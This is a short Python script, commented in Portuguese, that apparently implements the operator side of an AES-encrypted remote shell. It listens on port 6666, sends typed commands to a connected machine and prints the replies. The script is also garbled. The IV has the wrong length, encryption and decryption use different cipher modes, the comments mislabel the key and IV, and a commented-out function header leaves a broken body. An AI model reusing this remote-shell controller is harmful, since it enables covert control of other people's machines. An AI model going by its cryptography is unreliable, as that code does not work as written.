from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding

IV = b"001122334455667788990011223344556"  # chave secreta
key = b"6E5A7234753778214125432A462D4A61" # tamanho

def encrypt(message):
    encryptor = AES.new(key, AES.MODE_CFB, IV)
    padded_message = Padding.pad(message, 16)
    encrypted_message = encryptor.encrypt(padded_message)
    return encrypted_message

def decrypt(cipher):
    decryptor = AES.new(key, AES.MODE_CBC, IV)
    decrypted_padded_message = decryptor.decrypt(cipher)
    decrypted_message = Padding.unpad(decrypted_padded_message, 16)
    return decrypted_message

#def connect():

    s = socket.socket()
    s.bind(('192.168.0.1', 6666))
    s.listen(1) 
    conn, address = s.accept()
    while True:

        entrada = input("shell: ")
        if 'sair' in entrada:
            conn.send(encrypt(b'sair'))
            conn.close()
            break
        else:
            entrada= encrypt(entrada.encode()) # protegida
            conn.send(entrada)# envia mensagem criptografada
            print(decrypt(conn.recv(1024)).decode())# mensagem cript

decrypt("s72hScBWGk6Pgjn5RUKtFQqo0vRHZ5g=")